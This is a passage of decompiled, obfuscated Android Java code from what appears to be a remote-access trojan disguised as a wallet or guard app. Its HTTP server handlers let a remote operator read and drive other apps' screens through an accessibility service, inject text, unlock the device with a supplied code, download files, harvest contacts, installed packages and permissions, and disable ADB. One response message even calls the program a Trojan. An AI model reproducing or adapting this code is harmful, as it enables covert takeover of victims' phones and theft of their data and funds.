                apiResult.setData(m651X);
                apiResult.setCount(Integer.valueOf(m651X.size()));
                apiResult.setCode(200);
                apiResult.setMsg("OK");
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void k0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByClassNameStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void k1(AbstractC0381k abstractC0381k, String str) {
        try {
            if (AbstractC0026q.m151B(str)) {
                m500p(abstractC0381k, "text不能为空");
                return;
            }
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            UiObject m560J = MyAccessibilityService.m554P().m560J();
            boolean text = m560J != null ? m560J.setText(str) : false;
            if (!text && C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                text = C0318e.m844S().m855N("input text ".concat(str));
            }
            apiResult.setData(Boolean.valueOf(text));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void k2(AbstractC0381k abstractC0381k) {
        C0241j c0241j;
        C0241j c0241j2;
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            synchronized (C0241j.class) {
                c0241j = C0241j.f385g;
            }
            if (c0241j != null) {
                BlockViewVO blockViewVO = !AbstractC0251g.p0() ? new BlockViewVO(false, AbstractC0248d.m611i(), false, false) : null;
                synchronized (C0241j.class) {
                    c0241j2 = C0241j.f385g;
                }
                c0241j2.getClass();
                apiResult.setData(Boolean.valueOf(C0241j.m586g(blockViewVO, false)));
                apiResult.setCount(1);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void k3(AbstractC0381k abstractC0381k, boolean z2) {
        boolean m683D;
        try {
            ApiResult apiResult = new ApiResult();
            synchronized (AbstractC0252h.class) {
                m683D = AbstractC0252h.m683D(Boolean.valueOf(z2), "adbCanWriteSecure");
            }
            apiResult.setData(Boolean.valueOf(m683D));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: l */
    public static void m496l(AbstractC0381k abstractC0381k, String str) {
        try {
            if (AbstractC0026q.m151B(str)) {
                m500p(abstractC0381k, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                return;
            }
            boolean m659f = AbstractC0251g.m659f(str);
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(m659f));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void l0(String str, CombineFilter combineFilter, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1075n;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
                return;
            }
            try {
                m1075n = o12.m1075n(combineFilter);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1075n != null) {
                searchNodeResultVO = o12.m1059D(m1075n.findLastByCombine(combineFilter));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void l1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(AbstractC0251g.j0()));
            apiResult.setCount(1);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void l2(PermissionRequestVO permissionRequestVO, AbstractC0381k abstractC0381k) {
        try {
            if (permissionRequestVO == null) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、动作参数不能为空");
                return;
            }
            ApiResult apiResult = new ApiResult();
            if (C0262b.f433a != null) {
                C0262b.f433a.getClass();
                apiResult.setData(C0262b.m740f(permissionRequestVO));
                apiResult.setCount(1);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void l3(AbstractC0381k abstractC0381k) {
        Boolean bool;
        try {
            ApiResult apiResult = new ApiResult();
            int i2 = 1;
            if (AbstractC0251g.m667n()) {
                AbstractC0243l.m594d(new CallableC0244m(i2), "SYNC_DEVICE_CONTACTS");
                bool = Boolean.TRUE;
            } else {
                bool = Boolean.FALSE;
            }
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: m */
    public static void m497m(AbstractC0381k abstractC0381k) {
        try {
            CallStateVO m660g = AbstractC0251g.m660g();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(m660g);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void m0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByDesc(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void m1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            C0896a c0896a = new C0896a();
            c0896a.f1989b = 2;
            c0896a.f1991d = "Device is in Power Save Mode";
            c0896a.f1990c = "Device is in Power Save Mode";
            apiResult.setData(c0896a);
            apiResult.setCode(609);
            apiResult.setMsg("木马正在运行,设备处于省电模式,系统处于省电保活策略,请勿访问");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.FALSE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void m2(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            Long P0 = AbstractC0251g.P0();
            if (P0 != null && P0.longValue() > 0) {
                apiResult.setCount(1);
                apiResult.setData(P0);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
            }
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void m3(String str, String str2, boolean z2, AbstractC0381k abstractC0381k) {
        try {
            if (AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "fileUrl不能为空");
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            apiResult.setSuccess(Boolean.TRUE);
            if (AbstractC0026q.m151B(str)) {
                str = AbstractC0251g.i0();
            }
            String m191x = AbstractC0026q.m191x(str2);
            if (AbstractC0026q.m151B(m191x)) {
                m191x = EnvironmentCompat.MEDIA_UNKNOWN;
            }
            String concat = str.concat("/").concat(m191x);
            if (AbstractC0857b.m1241b(str2, concat)) {
                RespDownloadFileVO respDownloadFileVO = new RespDownloadFileVO();
                respDownloadFileVO.setFilePathAndName(concat);
                if (z2) {
                    respDownloadFileVO.setGalleryUrl(AbstractC0251g.N0(concat));
                }
                apiResult.setData(respDownloadFileVO);
                apiResult.setCount(1);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: n */
    public static void m498n(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            apiResult.setData(C0929c.f2113f != null ? Boolean.valueOf(C0929c.f2113f.m1394b(null)) : Boolean.FALSE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void n0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByDescContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void n1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData("OK");
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void n2(AbstractC0381k abstractC0381k) {
        try {
            ScreenMetricsVO m616e = AbstractC0249e.m616e();
            LockPatternVO B0 = AbstractC0251g.B0();
            m616e.setIsKeyguardLocked(B0.getIsKeyguardLocked());
            m616e.setIsKeyguardSecure(B0.getIsKeyguardSecure());
            m616e.setInKeyguardRestrictedInputMode(B0.getInKeyguardRestrictedInputMode());
            m616e.setIsDeviceLocked(B0.getIsDeviceLocked());
            m616e.setIsDeviceSecure(B0.getIsDeviceSecure());
            m616e.setQuality(B0.getQuality());
            ApiResult apiResult = new ApiResult();
            apiResult.setData(m616e);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void n3(ReqUnlockDeviceVO reqUnlockDeviceVO, AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            if (reqUnlockDeviceVO == null || AbstractC0026q.m151B(reqUnlockDeviceVO.getCipherGradeCode())) {
                AbstractC0207l.m420c();
            } else {
                AbstractC0252h.m690K(reqUnlockDeviceVO);
            }
            apiResult.setData(Boolean.TRUE);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: o */
    public static void m499o(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCount(1);
            if (CustomNotificationService.f315c != null) {
                apiResult.setData(Boolean.TRUE);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void o0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByDescEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static C0416e o1(String str) {
        if (MyAccessibilityService.m554P() != null) {
            MyAccessibilityService m554P = MyAccessibilityService.m554P();
            m554P.getClass();
            try {
                if (!AbstractC0026q.m151B(str)) {
                    ConcurrentLinkedQueue concurrentLinkedQueue = m554P.f303a;
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it = concurrentLinkedQueue.iterator();
                        while (it.hasNext()) {
                            C0416e c0416e = (C0416e) it.next();
                            if (Objects.equals(c0416e.f864c, str)) {
                                return c0416e;
                            }
                        }
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            }
        }
        return null;
    }

    public static void o2(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1075n;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    C0416e o12 = o1(combineFilterWithChild.getParentFilter().getDelegateId());
                    if (m508x(o12, abstractC0381k)) {
                        return;
                    }
                    if (o12 != null) {
                        try {
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("AccessibilityDelegate", e2);
                        }
                        if (combineFilterWithChild.getParentFilter() != null && (m1075n = o12.m1075n(combineFilterWithChild.getParentFilter())) != null) {
                            searchNodeListResultVO = o12.m1058C(m1075n.scrollBackwardUtilMultiple(new C0980c(combineFilterWithChild, 0)));
                            ApiResult apiResult = new ApiResult();
                            apiResult.setData(searchNodeListResultVO);
                            apiResult.setCode(200);
                            apiResult.setMsg("OK");
                            apiResult.setCount(1);
                            apiResult.setSuccess(Boolean.TRUE);
                            String m693N = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N);
                            abstractC0381k.mo787l();
                            return;
                        }
                        searchNodeListResultVO = null;
                        ApiResult apiResult2 = new ApiResult();
                        apiResult2.setData(searchNodeListResultVO);
                        apiResult2.setCode(200);
                        apiResult2.setMsg("OK");
                        apiResult2.setCount(1);
                        apiResult2.setSuccess(Boolean.TRUE);
                        String m693N2 = AbstractC0252h.m693N(apiResult2);
                        abstractC0381k.f771l = apiResult2.getCode().intValue();
                        abstractC0381k.m952h(m693N2);
                        abstractC0381k.mo787l();
                        return;
                    }
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void o3(AbstractC0381k abstractC0381k) {
        Boolean bool;
        try {
            ApiResult apiResult = new ApiResult();
            if (AbstractC0251g.m665l()) {
                AbstractC0243l.m594d(new CallableC0244m(2), "SYNC_DEVICE_INSTALLED_PACKAGES");
                bool = Boolean.TRUE;
            } else {
                bool = Boolean.FALSE;
            }
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: p */
    public static void m500p(AbstractC0381k abstractC0381k, String str) {
        try {
            ApiResult apiResult = new ApiResult();
            C0896a c0896a = new C0896a();
            c0896a.f1989b = 1;
            c0896a.f1991d = "Illegal parameter";
            c0896a.f1990c = "Illegal parameter";
            apiResult.setData(c0896a);
            apiResult.setCode(600);
            apiResult.setMsg(str);
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.FALSE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void p0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByDescMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void p1(String str, String str2, String str3, String str4, AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            apiResult.setSuccess(Boolean.TRUE);
            if (C0318e.m844S() != null) {
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setData(Boolean.valueOf(C0318e.m844S().m848G(str, str2, str3, str4)));
                apiResult.setCount(1);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void p2(CombineFilter combineFilter, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1075n;
        if (combineFilter != null) {
            try {
                C0416e o12 = o1(combineFilter.getDelegateId());
                if (m508x(o12, abstractC0381k)) {
                    return;
                }
                if (o12 != null) {
                    try {
                        m1075n = o12.m1075n(combineFilter);
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("AccessibilityDelegate", e2);
                    }
                    if (m1075n != null) {
                        searchNodeListResultVO = o12.m1058C(m1075n.scrollBackwardUtilMultiple(new C0981d(combineFilter, 0)));
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(searchNodeListResultVO);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    searchNodeListResultVO = null;
                    ApiResult apiResult2 = new ApiResult();
                    apiResult2.setData(searchNodeListResultVO);
                    apiResult2.setCode(200);
                    apiResult2.setMsg("OK");
                    apiResult2.setCount(1);
                    apiResult2.setSuccess(Boolean.TRUE);
                    String m693N2 = AbstractC0252h.m693N(apiResult2);
                    abstractC0381k.f771l = apiResult2.getCode().intValue();
                    abstractC0381k.m952h(m693N2);
                    abstractC0381k.mo787l();
                    return;
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void p3(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            AbstractC0243l.m594d(new CallableC0244m(3), "SYNC_APP_PERMISSIONS");
            Boolean bool = Boolean.TRUE;
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(bool);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: q */
    public static void m501q(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCount(1);
            if (MainApplication.getAppContext() != null && Settings.System.canWrite(MainApplication.getAppContext()) && AbstractC0251g.m636I()) {
                Settings.Global.putInt(MainApplication.getAppContext().getContentResolver(), "adb_enabled", 0);
            }
            if (!AbstractC0251g.m636I()) {
                apiResult.setData(Boolean.TRUE);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void q0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
